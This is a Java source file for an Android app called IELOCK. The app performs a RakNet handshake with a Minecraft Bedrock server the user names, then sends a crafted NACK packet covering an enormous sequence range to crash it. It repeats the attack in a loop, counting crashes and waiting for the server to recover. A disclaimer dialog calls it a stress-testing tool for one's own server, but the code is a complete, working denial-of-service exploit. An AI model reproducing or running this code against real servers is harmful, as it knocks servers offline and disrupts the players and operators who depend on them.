package org.whairt.ielock.x19;
/*
 * Copyright 2026 Whitehairt
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
import android.app.Activity;
import android.app.AlertDialog;
import android.content.DialogInterface;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.nio.ByteBuffer;
import java.util.Random;

public class MainActivity extends Activity {

    private EditText etHost, etPort;
    private Button btnStart;
    private TextView tvLog;
    private Handler uiHandler;
    private volatile boolean running = false;
    private Thread workerThread;

    private static final byte[] MAGIC = {
        0x00, (byte) 0xff, (byte) 0xff, 0x00,
        (byte) 0xfe, (byte) 0xfe, (byte) 0xfe, (byte) 0xfe,
        (byte) 0xfd, (byte) 0xfd, (byte) 0xfd, (byte) 0xfd,
        0x12, 0x34, 0x56, (byte) 0x78
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        etHost = (EditText) findViewById(R.id.et_host);
        etPort = (EditText) findViewById(R.id.et_port);
        btnStart = (Button) findViewById(R.id.btn_start);
        tvLog = (TextView) findViewById(R.id.tv_log);

        uiHandler = new Handler(Looper.getMainLooper());

        btnStart.setOnClickListener(new View.OnClickListener() {
                @Override
                public void onClick(View v) {
                    if (running) {
                        running = false;
                        btnStart.setText("锁服");
                        if (workerThread != null) {
                            workerThread.interrupt();
                        }
                        appendLog("Stopped by user.");
                        return;
                    }

                    final String host = etHost.getText().toString().trim();
                    final String portStr = etPort.getText().toString().trim();
                    if (host.isEmpty() || portStr.isEmpty()) {
                        appendLog("Error: Host and Port must be filled.");
                        return;
                    }
                    final int port;
                    try {
                        port = Integer.parseInt(portStr);
                    } catch (NumberFormatException e) {
                        appendLog("Error: Invalid port number.");
                        return;
                    }

                    running = true;
                    btnStart.setText("停止");
                    tvLog.setText("");
                    appendLog("Starting attack on " + host + ":" + port + " ...");

                    workerThread = new Thread(new Runnable() {
                            @Override
                            public void run() {
                                runAttack(host, port);
                            }
                        });
                    workerThread.start();
                }
            });

        showDisclaimerDialog();
    }

    private void showDisclaimerDialog() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("️Warning");
        builder.setMessage(
            "IELOCK 永久免费，如果你是买来的，那恭喜你被骗了\n\n" +
            "此工具仅可用于对自己 Minecraft 服务器压力测试使用\n" +
            "请勿用于非法用途\n\n" +
            "我的 GMAIL：whitehairt304@gmail.com\n\n" +
            "仅供学习用，请下载后 24 小时之内删除\n" +
            "否则开发者不承担任何责任"
        );
        builder.setCancelable(false);
        builder.setPositiveButton("我已知晓", new DialogInterface.OnClickListener() {
                @Override
                public void onClick(DialogInterface dialog, int which) {
                    dialog.dismiss();
                }
            });
        builder.show();
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        running = false;
        if (workerThread != null) {
            workerThread.interrupt();
        }
    }

    private void appendLog(final String msg) {
        uiHandler.post(new Runnable() {
                @Override
                public void run() {
                    tvLog.append(msg + "\n");
                }
            });
    }


    private void runAttack(String host, int port) {
        if (!probe(host, port, 5)) {
            appendLog("error: host unreachable");
            return;
        }

        int loopNum = 0;
        int crashCount = 0;
        int deadStreak = 0;

        while (running) {
            loopNum++;
            appendLog("[loop " + loopNum + "] (crashes: " + crashCount + ")");

            long guid = rand64();
            DatagramSocket sock = handshake(host, port, guid);
            if (sock == null) {
                appendLog("  error: handshake failed");
                try { Thread.sleep(500); } catch (InterruptedException e) { break; }
                continue;
            }

            appendLog("  handshake ok");
            try {
                nackAll(sock, host, port);
            } catch (Exception e) {
                appendLog("  nack send error: " + e.getMessage());
            }
            try { Thread.sleep(5000); } catch (InterruptedException e) { break; }
            sock.close();

            if (!probe(host, port, 5)) {
                crashCount++;
                appendLog("  crashed (total: " + crashCount + ")");
                appendLog("  waiting for server recovery (max 10s)...");
                if (waitUntilAlive(host, port, 10.0, 1.0)) {
                    deadStreak = 0;
                } else {
                    deadStreak++;
                    appendLog("  no response for 10s, waiting 30s (streak: " + deadStreak + "/2)...");
                    if (deadStreak >= 2) {
                        appendLog("  2 consecutive failures, exiting");
                        break;
                    }
                    try { Thread.sleep(30000); } catch (InterruptedException e) { break; }
                }
            } else {
                deadStreak = 0;
                try { Thread.sleep(200); } catch (InterruptedException e) { break; }
            }
        }
        appendLog("Attack loop ended.");
        uiHandler.post(new Runnable() {
                @Override
                public void run() {
                    running = false;
                    btnStart.setText("锁服");
                }
            });
    }

    private long rand64() {
        return new Random().nextLong();
    }

    private DatagramSocket handshake(String host, int port, long guid) {
        try {
            DatagramSocket sock = new DatagramSocket();
            sock.setSoTimeout(3000);
            InetAddress addr = InetAddress.getByName(host);

            // 1) 0x05 首包，填充至1400字节（所有剩余填0）
            byte[] pkt1 = new byte[1400];
            int pos = 0;
            pkt1[pos++] = 0x05;
            System.arraycopy(MAGIC, 0, pkt1, pos, MAGIC.length);
            pos += MAGIC.length;
            pkt1[pos++] = 0x08;
            // 剩余默认0
            sock.send(new DatagramPacket(pkt1, pkt1.length, addr, port));

            byte[] buf = new byte[2048];
            DatagramPacket rp = new DatagramPacket(buf, buf.length);
            try { sock.receive(rp); } catch (Exception e) { sock.close(); return null; }
            if (rp.getLength() < 1 || buf[0] != 0x06) { sock.close(); return null; }

            // 2) 0x07
            ByteBuffer pkt2 = ByteBuffer.allocate(1 + 16 + 1 + 4 + 2 + 2 + 8);
            pkt2.put((byte) 0x07);
            pkt2.put(MAGIC);
            pkt2.put((byte) 0x04);
            int ipInt = ByteBuffer.wrap(addr.getAddress()).getInt();
            int ipEnc = ~ipInt;
            pkt2.putInt(ipEnc);
            pkt2.putShort((short) port);
            pkt2.putShort((short) 1400);
            pkt2.putLong(guid);
            sock.send(new DatagramPacket(pkt2.array(), pkt2.position(), addr, port));

            try { sock.receive(rp); } catch (Exception e) { sock.close(); return null; }
            if (rp.getLength() < 1 || buf[0] != 0x08) { sock.close(); return null; }

            // 3) 连接请求
            ByteBuffer connReq = ByteBuffer.allocate(1 + 8 + 8 + 1);
            connReq.put((byte) 0x09);
            connReq.putLong(guid);
            connReq.putLong(0L);
            connReq.put((byte) 0x00);
            byte[] cr = connReq.array();

            ByteBuffer frame = ByteBuffer.allocate(1 + 2 + 3 + cr.length);
            frame.put((byte) 0x40);
            frame.putShort((short) (cr.length * 8));
            frame.put(new byte[]{0, 0, 0});
            frame.put(cr);
            byte[] fr = frame.array();

            ByteBuffer pkt3 = ByteBuffer.allocate(1 + 3 + fr.length);
            pkt3.put((byte) 0x84);
            pkt3.put(new byte[]{0, 0, 0});
            pkt3.put(fr);
            sock.send(new DatagramPacket(pkt3.array(), pkt3.position(), addr, port));

            boolean found = false;
            for (int i = 0; i < 12 && !found; i++) {
                try { sock.receive(rp); } catch (Exception e) { continue; }
                if (rp.getLength() < 1) continue;
                if (buf[0] == (byte) 0x84) {
                    int seq = (buf[1] & 0xff) | ((buf[2] & 0xff) << 8) | ((buf[3] & 0xff) << 16);
                    // ACK
                    ByteBuffer ack = ByteBuffer.allocate(7);
                    ack.put((byte) 0xC0);
                    ack.put((byte) 0x00);
                    ack.put((byte) 0x01);
                    ack.put((byte) (seq & 0xff));
                    ack.put((byte) ((seq >> 8) & 0xff));
                    ack.put((byte) ((seq >> 16) & 0xff));
                    ack.put((byte) 0x00);
                    sock.send(new DatagramPacket(ack.array(), ack.position(), addr, port));

                    if (rp.getLength() > 14 && buf[4] == 0x60 && buf[14] == 0x10) {
                        // NIC
                        ByteBuffer entry4 = ByteBuffer.allocate(1 + 4 + 2 + 10);
                        entry4.put((byte) 0x04);
                        entry4.put(addr.getAddress());
                        entry4.putShort((short) port);
                        entry4.put(new byte[10]);
                        byte[] e4 = entry4.array();

                        ByteBuffer entry6 = ByteBuffer.allocate(1 + 28);
                        entry6.put((byte) 0x06);
                        entry6.put(new byte[28]);
                        byte[] e6 = entry6.array();

                        ByteBuffer nic = ByteBuffer.allocate(1 + e4.length + 9 * e6.length + 16);
                        nic.put((byte) 0x13);
                        nic.put(e4);
                        for (int j = 0; j < 9; j++) nic.put(e6);
                        nic.put(new byte[16]);
                        byte[] nicArr = nic.array();

                        ByteBuffer f2 = ByteBuffer.allocate(1 + 2 + 3 + nicArr.length);
                        f2.put((byte) 0x40);
                        f2.putShort((short) (nicArr.length * 8));
                        f2.put(new byte[]{1, 0, 0});
                        f2.put(nicArr);
                        byte[] f2Arr = f2.array();

                        ByteBuffer pkt4 = ByteBuffer.allocate(1 + 3 + f2Arr.length);
                        pkt4.put((byte) 0x84);
                        pkt4.put(new byte[]{1, 0, 0});
                        pkt4.put(f2Arr);
                        sock.send(new DatagramPacket(pkt4.array(), pkt4.position(), addr, port));
                        found = true;
                    }
                }
            }
            if (!found) { sock.close(); return null; }
            return sock;
        } catch (Exception e) {
            e.printStackTrace();
            return null;
        }
    }

    private void nackAll(DatagramSocket sock, String host, int port) throws IOException {
        InetAddress addr = InetAddress.getByName(host);
        byte[] pkt = {
            (byte) 0xA0, 0x00, 0x01, 0x00,
            0x00, 0x00, 0x00,
            (byte) 0xFF, (byte) 0xFF, (byte) 0xFF
        };
        sock.send(new DatagramPacket(pkt, pkt.length, addr, port));
    }

    private boolean probe(String host, int port, int timeout) {
        int retries = 3;
        int perTimeout = Math.max(timeout / retries, 1);
        for (int attempt = 0; attempt < retries; attempt++) {
            try {
                DatagramSocket sock = new DatagramSocket();
                sock.setSoTimeout(perTimeout * 1000);
                InetAddress addr = InetAddress.getByName(host);

                // 构造 38 字节探测包 (与 Python 完全一致)
                byte[] data = new byte[38];
                int pos = 0;
                data[pos++] = 0x05;
                System.arraycopy(MAGIC, 0, data, pos, MAGIC.length);
                pos += MAGIC.length;
                data[pos++] = 0x08;
                for (int i = 0; i < 20; i++) data[pos++] = 0; // 20个零

                sock.send(new DatagramPacket(data, data.length, addr, port));

                byte[] buf = new byte[256];
                DatagramPacket rp = new DatagramPacket(buf, buf.length);
                sock.receive(rp);
                sock.close();

                if (rp.getLength() > 0 &&
                    (buf[0] == 0x06 || buf[0] == 0x08 || buf[0] == 0x19)) {
                    return true;
                }
            } catch (Exception e) {
                // 忽略，继续重试
            }
        }
        return false;
    }

    private boolean waitUntilAlive(String host, int port, double total, double interval) {
        long start = System.currentTimeMillis();
        while (System.currentTimeMillis() - start < total * 1000) {
            int timeout = (int) (total - (System.currentTimeMillis() - start) / 1000.0);
            if (timeout < 1) timeout = 1;
            if (probe(host, port, timeout)) return true;
            try { Thread.sleep(100); } catch (InterruptedException e) { break; }
        }
        return false;
    }
}
